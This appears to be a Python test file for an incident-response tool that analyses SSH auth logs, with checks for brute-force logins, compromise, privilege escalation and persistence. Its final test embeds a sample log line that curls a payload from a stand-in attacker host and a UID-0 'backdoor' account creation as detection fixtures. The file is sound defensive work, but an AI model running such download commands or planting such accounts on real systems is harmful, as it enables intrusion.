from ir_agent.tools.log_analysis import analyze_auth_log, looks_like_auth_log

BRUTE_FORCE_LOG = "\n".join(
    f"Jan 14 02:11:{i:02d} host sshd[100]: Failed password for root from 91.219.236.18 port 5000{i} ssh2"
    for i in range(5)
)


def test_looks_like_auth_log_detects_sshd_lines():
    assert looks_like_auth_log(BRUTE_FORCE_LOG) is True
    assert looks_like_auth_log("Just a plain English incident description.") is False


def test_brute_force_detection_respects_threshold():
    findings = analyze_auth_log(BRUTE_FORCE_LOG)
    assert findings["failed_logins_by_ip"]["91.219.236.18"] == 5
    assert findings["brute_force_ips"] == ["91.219.236.18"]


def test_below_threshold_is_not_flagged_as_brute_force():
    log = "\n".join(
        f"Jan 14 02:11:{i:02d} host sshd[100]: Failed password for root from 10.0.0.5 port 5000{i} ssh2"
        for i in range(2)
    )
    findings = analyze_auth_log(log)
    assert findings["brute_force_ips"] == []


def test_accepted_login_after_brute_force_flags_compromise():
    log = BRUTE_FORCE_LOG + "\nJan 14 02:12:03 host sshd[101]: Accepted password for root from 91.219.236.18 port 51488 ssh2"
    findings = analyze_auth_log(log)
    assert findings["likely_compromised_ips"] == ["91.219.236.18"]
    assert findings["accepted_logins"] == [{"user": "root", "ip": "91.219.236.18"}]


def test_privilege_escalation_and_persistence_detection():
    log = (
        "Jan 14 02:13:41 host sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; "
        "COMMAND=/usr/bin/curl -o /tmp/upd http://evil.example/x\n"
        "Jan 14 02:15:10 host crontab[9012]: (root) REPLACE (root)\n"
        "Jan 14 02:16:00 host useradd[9013]: new user: name=backdoor, UID=0, GID=0, home=/home/backdoor\n"
    )
    findings = analyze_auth_log(log)
    assert findings["privilege_escalation"] == ["/usr/bin/curl -o /tmp/upd http://evil.example/x"]
    assert {"type": "crontab", "user": "root", "action": "REPLACE"} in findings["persistence_events"]
    assert {"type": "useradd", "name": "backdoor", "uid": 0} in findings["persistence_events"]
